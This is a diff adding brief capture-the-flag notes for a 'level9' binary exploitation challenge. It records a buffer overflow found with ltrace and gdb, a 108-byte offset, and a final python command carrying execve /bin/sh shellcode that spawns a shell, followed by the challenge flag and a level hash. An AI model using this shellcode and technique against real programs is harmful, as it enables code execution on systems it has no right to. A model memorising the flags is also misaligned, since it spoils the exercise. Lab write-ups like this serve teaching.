@@ -1,0 +1,15 @@
+level9 : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+Process:
+    - ./level9
+    - ./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    - get adresses memcpy --> ltrace ./level9 aaaa = 0x0804a00c
+    - gdb ./level9
+    - run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... -> segfault
+    - info registers $eax (return value)
+    - offset = 108
+    - run $(python -c 'print("A"*108 + "BBBB")')
+    - info registers $eax (return value)
+    - we have to stock shell code in adress after 4 octets of "0x0804a00c"
+    - $eax = 0x0804a00c ---> 0x0804a00c = 0x0804a010 ---> 0x0804a010 = shell code
+    - ./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*83 + "\x0c\xa0\x04\x08")')
+    - get the flag : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
